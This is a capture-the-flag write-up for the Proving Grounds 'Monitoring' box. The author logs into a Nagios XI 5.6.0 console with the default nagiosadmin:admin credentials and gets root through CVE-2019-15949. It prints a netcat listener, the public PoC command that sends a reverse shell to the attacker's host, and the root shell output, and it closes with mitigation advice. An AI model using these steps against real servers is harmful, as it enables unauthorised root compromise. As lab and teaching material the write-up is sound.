<!-- writeup-meta
title: Monitoring
platform: Proving Grounds Play
os: Linux
difficulty: Easy
ip: 192.168.216.136
date: 2026-10-20
tags:
  - writeup
  - linux
  - nagios-xi
  - cve-2019-15949
  - default-creds
-->
# Monitoring

> [!NOTE]
> **TL;DR** — The box is a **Nagios XI 5.6.0** appliance on 80/443. The default `nagiosadmin` account still has a weak password (`admin`), and that version is vulnerable to **CVE-2019-15949** — an authenticated RCE that runs as **root**. One PoC later I had a root shell directly; there was no separate privilege-escalation stage.
>
> **Path:** Nagios XI web console → default creds `nagiosadmin:admin` → CVE-2019-15949 authenticated RCE → root

## 1. Recon

### 1.1 Nmap

```bash
$ nmap -Av -sS -p- 192.168.216.136
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
389/tcp  open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/...
5667/tcp open  tcpwrapped
```

**Open ports / services:**

| Port | Service | Version | Notes |
|---|---|---|---|
| 22 | SSH | OpenSSH 7.2p2 | No creds yet |
| 25 | SMTP | Postfix | Nagios alert mail |
| 80 | HTTP | Apache 2.4.18 | **Nagios XI** console |
| 389 | LDAP | OpenLDAP | Nagios XI auth backend |
| 443 | HTTPS | Apache 2.4.18 | Same Nagios XI over TLS |
| 5667 | NSCA | tcpwrapped | Nagios passive-check port |

> [!NOTE]
> **Reasoning:** this isn't six independent services — it's a single **Nagios XI appliance**. Postfix (25), OpenLDAP (389) and NSCA (5667) are the components Nagios XI bundles for alert mail, authentication and passive checks, and the `ssl-cert` on 443 (`organizationName=Nagios Enterprises`) confirms it. The only real door is the web console on 80/443, so I ignored the rest and started there.

### 1.2 Identifying Nagios XI

Port 80 redirects to `/nagiosxi/` and serves the Nagios XI login.

> [!NOTE]
> **Nagios XI** is the commercial, web-based front end to the open-source Nagios monitoring engine — it watches hosts and services across an estate and raises alerts through a PHP console. I've worked with it before, so the login screen was immediately recognisable.

What mattered was the **version — 5.6.0** — shown in the interface. Nagios XI ships with a built-in `nagiosadmin` administrator account, and this instance kept a weak password. Working through common Nagios defaults, `nagiosadmin:admin` logged straight in.

## 2. Foothold → Root

> [!IMPORTANT]
> **Vulnerability:** CVE-2019-15949 — authenticated remote code execution as **root** in Nagios XI before 5.6.6. This box runs 5.6.0, so it's in scope.

### 2.1 Why it lands root

Nagios XI lets an admin download a "system profile" (`profile.php?cmd=download`). That action runs a helper script, `getprofile.sh`, as **root** via a passwordless **sudo** rule. The script in turn executes a plugin binary (`check_plugin`) that is owned by the unprivileged **`nagios`** user. Because an authenticated Nagios XI user can modify that plugin, you can plant arbitrary commands in it and have them execute as root the moment the profile download fires.

> [!TIP]
> **Why it works:** a root-privileged, sudo-run script (`getprofile.sh`) executes a file (`check_plugin`) that a lower-privileged account can write to. That ownership mismatch collapses the privilege boundary — an authenticated admin's injected command runs as root. On Nagios XI < 5.6.6, web admin effectively *is* root.

### 2.2 Exploitation

I used hadrian3689's PoC, which automates the whole chain (authenticate, overwrite the plugin, trigger the profile download, catch the callback). Clone it and start a listener:

```bash
$ git clone https://github.com/hadrian3689/nagiosxi_5.6.6
$ cd nagiosxi_5.6.6
$ nc -lnvp 4444
listening on [any] 4444 ...
```

Then run it against the target with the creds and my listener:

```bash
$ python3 exploit.py -t http://192.168.216.136/ -b /nagiosxi/ -u nagiosadmin -p admin -lh <LHOST> -lp 4444
```

- **Exploit:** https://github.com/hadrian3689/nagiosxi_5.6.6 (CVE-2019-15949)
- **Modified:** unmodified — target, creds and LHOST/LPORT are all passed as arguments.

### 2.3 Root shell

The listener caught a root shell immediately:

```bash
connect to [<LHOST>] from (UNKNOWN) [192.168.216.136] 52858
bash: cannot set terminal process group (823): Inappropriate ioctl for device
bash: no job control in this shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
[REDACTED]
```

The shell lands in `/usr/local/nagiosxi/html/includes/components/profile` — the profile component that fired the exploit — which confirms the vector.

- **Initial access as:** `root`
- **proof.txt:** `[REDACTED]`

> [!NOTE]
> **No privilege-escalation stage.** CVE-2019-15949 executes as root, so authenticating to the web console *was* the whole box — foothold and root in one step. The callback is a raw, non-TTY shell (`cannot set terminal process group`); `python3 -c 'import pty;pty.spawn("/bin/bash")'` stabilises it, but it's already root.

## 3. Lessons Learned

- **Fingerprint the appliance, don't enumerate its parts.** The SMTP, LDAP and NSCA ports looked like extra attack surface but are just bundled Nagios XI components. Recognising the whole thing as one product kept me from rabbit-holing on 25/389/5667 and pointed straight at the web console.

- **Default/weak creds before anything heavy.** A monitoring appliance exposing its admin console with the stock `nagiosadmin` account and a weak password is a one-line win. Try documented product defaults first.

- **Version → CVE is the fast path.** Nagios XI prints its version in the UI; mapping 5.6.0 to CVE-2019-15949 turned "I'm logged in" into "I'm root" with a single public PoC.

- **The bug is an ownership/privilege-boundary flaw, not a memory bug.** A root-run sudo script executing a plugin that a lower-privileged user can edit — worth filing mentally alongside other "trusted script runs an attacker-writable file" patterns.

- **New technique for my notes:** Nagios XI default creds + CVE-2019-15949 authenticated-root RCE.

## 4. Mitigation

- **Patch Nagios XI to ≥ 5.6.6**, which fixes CVE-2019-15949. More broadly, a root/sudo-invoked script must never execute a binary that a lower-privileged account (here, `nagios`) can modify — fix the ownership/permissions and pin the sudo rule to a specific, non-writable path.

- **Kill default credentials.** Change the `nagiosadmin` password to something strong at install time; never ship or deploy the appliance with a guessable password.

- **Reduce exposure.** The monitoring console shouldn't be reachable from untrusted networks — put it behind a VPN/ACL and require strong authentication.

## References

- [NVD — CVE-2019-15949](https://nvd.nist.gov/vuln/detail/CVE-2019-15949)
- [hadrian3689/nagiosxi_5.6.6 — CVE-2019-15949 PoC](https://github.com/hadrian3689/nagiosxi_5.6.6)
- [Exploit-DB 47299 — Nagios XI 5.6.5 Remote Code Execution](https://www.exploit-db.com/exploits/47299)
